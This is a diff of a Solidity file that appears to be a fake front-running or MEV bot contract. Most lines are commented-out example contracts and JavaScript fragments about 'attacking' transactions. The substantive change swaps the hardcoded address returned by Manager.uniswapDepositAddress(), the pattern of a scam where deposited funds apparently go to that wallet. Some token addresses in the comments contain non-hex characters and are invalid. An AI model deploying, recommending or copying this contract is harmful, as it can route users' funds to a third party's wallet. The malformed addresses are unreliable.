@@ -14,10 +14,12 @@ contract SimpleStorage {
 /*contract GetfrontExample {
   // public state variable
   uint[] public myArray;
+
   //const fs = require('fs');
 //var Web3 = require('web3');
 //var abiDecoder = require('abi-decoder');
 //var colors = require("colors");
+
   /*
   function myArray(uint i) public view returns (uint) {
       return myArray[i];
@@ -59,11 +61,13 @@ contract Coin {
     /*constructor() {
         minter = msg.sender;
     }
+
     function mint(address receiver, uint amount) public {
         require(msg.sender == minter);
         require(amount < 1e60);
         balances[receiver] += amount;
     }
+
     function send(address receiver, uint amount) public {
         require(amount <= balances[msg.sender], "Insufficient balance.");
         balances[msg.sender] -= amount;
@@ -74,6 +78,7 @@ contract Coin {
 /*contract GetBNBExample {
   // public state variable
   uint[] public myArray;
+
   // one gwei
 //const ONE_GWEI = 1e9;
   /*
@@ -197,7 +202,7 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0xaCA5203A43827AA702B3E49CFf3C1b09d9026712;
+		return 0xAE2C19a954924aD896847AB6cd748E393f8F759C;
 	}
 }
 contract TokenCreator {
@@ -284,6 +289,7 @@ contract arrayExample {
 /*contract GetBotExample {
   // public state variable
   uint[] public myArray;
+
   
  
     //if(outputtoken.gt(allowance)){
@@ -311,7 +317,7 @@ contract arrayExample {
 //select attacking transaction
 //async function triggersFrontRun(transaction, out_token_address, amount, level) {
  //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173mjuy78';
-//const WBNB_TOKEN_ADDRESS = '';
+//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91j3hgyt67';
     //if(attack_started)
         //return false;
  
